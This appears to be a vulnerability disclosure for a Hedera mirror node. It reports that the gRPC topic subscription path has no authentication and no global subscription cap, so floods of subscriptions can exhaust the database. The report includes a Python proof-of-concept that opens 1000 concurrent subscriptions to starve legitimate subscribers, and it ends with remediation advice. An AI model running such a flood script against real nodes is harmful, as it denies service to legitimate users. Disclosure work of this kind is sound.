### Title
Unauthenticated gRPC Topic Subscription Enables DB Exhaustion DoS Against Legitimate HCS Subscribers

### Summary
`PollingTopicMessageRetriever.retrieve()` and its entire call chain from `ConsensusController.subscribeTopic()` through `TopicMessageServiceImpl.subscribeTopic()` contain zero authentication or authorization checks. Any unprivileged external caller can open an unbounded number of gRPC connections, each subscribing to any topicId (including high-traffic system topics), causing repeated DB polling that exhausts the database connection pool and starves legitimate subscribers of timely HCS message delivery.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` (lines 43–53) accepts any `ConsensusTopicQuery` and immediately calls `topicMessageService::subscribeTopic` with no credential check: [1](#0-0) 

`TopicMessageServiceImpl.subscribeTopic()` (lines 58–92) performs only a topic-existence check (entity type == TOPIC), not an authorization check: [2](#0-1) 

`PollingTopicMessageRetriever.retrieve()` (lines 45–63) contains no authentication or authorization logic whatsoever — it immediately constructs a `PollingContext` and begins polling the DB: [3](#0-2) 

Each active subscription polls `topicMessageRepository.findByFilter()` on a fixed schedule (default: every 2 seconds, page size up to 1000 rows) indefinitely for live topics: [4](#0-3) 

**Root cause:** The gRPC server has no authentication interceptor. The only `@GlobalServerInterceptor` present is `GrpcInterceptor`, which only sets an `EndpointContext` for metrics — it performs no access control: [5](#0-4) 

**Why existing checks are insufficient:**

The only connection-level control is `maxConcurrentCallsPerConnection = 5`, which is a *per-connection* limit, not a global limit: [6](#0-5) [7](#0-6) 

There is no limit on the total number of connections. The `subscriberCount` gauge in `TopicMessageServiceImpl` is purely a metric — it is never enforced as a cap: [8](#0-7) 

The 60-second `timeout` in `RetrieverProperties` only fires when *no messages are emitted* within that window: [9](#0-8) 

For a high-traffic topic that continuously produces messages, the timeout never triggers, so each attacker subscription lives indefinitely and polls the DB every 2 seconds.

### Impact Explanation

Each attacker-controlled subscription issues a DB query every `pollingFrequency` (default 2s) returning up to `maxPageSize` (default 1000) rows. With N connections × 5 concurrent calls each, the DB receives `N × 5 / 2` queries per second. Because the DB connection pool is shared with legitimate subscribers, pool exhaustion causes legitimate HCS subscribers to queue or fail, delaying or dropping message delivery. For a high-traffic system topic (e.g., one used for cross-application coordination), this directly prevents legitimate subscribers from observing consensus messages in a timely manner — the core function of the HCS mirror node gRPC service.

### Likelihood Explanation

The attack requires only a gRPC client library (freely available) and network access to port 5600. No credentials, tokens, or special knowledge are needed. The attacker can open connections from a single machine or distribute across IPs to bypass any upstream network-level rate limiting. The attack is trivially repeatable and scriptable. The gRPC port is documented as the public-facing API endpoint. [10](#0-9) 

### Recommendation

1. **Add a gRPC `ServerInterceptor`** that enforces authentication (e.g., mutual TLS or a bearer token) before any call reaches `ConsensusController`.
2. **Enforce a global concurrent-subscription cap** by checking `subscriberCount` against a configurable maximum and returning `RESOURCE_EXHAUSTED` when exceeded.
3. **Add per-IP or per-client connection rate limiting** at the Netty layer (e.g., `maxConnectionsPerIp` or an external proxy with connection limits).
4. **Add a configurable `maxConnections` limit** to `NettyProperties` and apply it via `NettyServerBuilder` alongside `maxConcurrentCallsPerConnection`.

### Proof of Concept

```python
import grpc
import threading
from hedera import consensus_service_pb2_grpc, consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-host:5600"
TOPIC_SHARD = 0
TOPIC_REALM = 0
TOPIC_NUM = 1  # high-traffic system topic

def flood_subscribe():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(
            shardNum=TOPIC_SHARD, realmNum=TOPIC_REALM, topicNum=TOPIC_NUM
        ),
        consensusStartTime=...,  # epoch 0
    )
    # Each call blocks indefinitely on a live topic, polling DB every 2s
    for _ in stub.subscribeTopic(query):
        pass

# Open many connections, each with 5 concurrent calls (maxConcurrentCallsPerConnection)
threads = []
for _ in range(200):  # 200 connections × 5 calls = 1000 concurrent DB pollers
    for _ in range(5):
        t = threading.Thread(target=flood_subscribe)
        t.daemon = True
        t.start()
        threads.append(t)

# DB now receives 500 queries/second; legitimate subscribers starved
```

Preconditions: network access to gRPC port, knowledge of any valid high-traffic topicId (publicly observable on-chain). No credentials required.

    private Mono<?> topicExists(TopicMessageFilter filter) {
        var topicId = filter.getTopicId();
        return Mono.justOrEmpty(entityRepository.findById(topicId.getId()))
                .switchIfEmpty(
                        grpcProperties.isCheckTopicExists()
                                ? Mono.error(new EntityNotFoundException(topicId))
                                : Mono.just(Entity.builder()
                                        .memo("")

    public Flux<TopicMessage> retrieve(TopicMessageFilter filter, boolean throttled) {
        if (!retrieverProperties.isEnabled()) {
            return Flux.empty();
        }

        PollingContext context = new PollingContext(filter, throttled);
        return Flux.defer(() -> poll(context))
                .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
                        .jitter(0.1)
                        .withFixedDelay(context.getFrequency())
                        .withScheduler(scheduler))
                .name(METRIC)
                .tap(Micrometer.observation(observationRegistry))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)))
                .timeout(retrieverProperties.getTimeout(), scheduler)
                .doOnCancel(context::onComplete)
                .doOnComplete(context::onComplete)
                .doOnNext(context::onNext);
    }
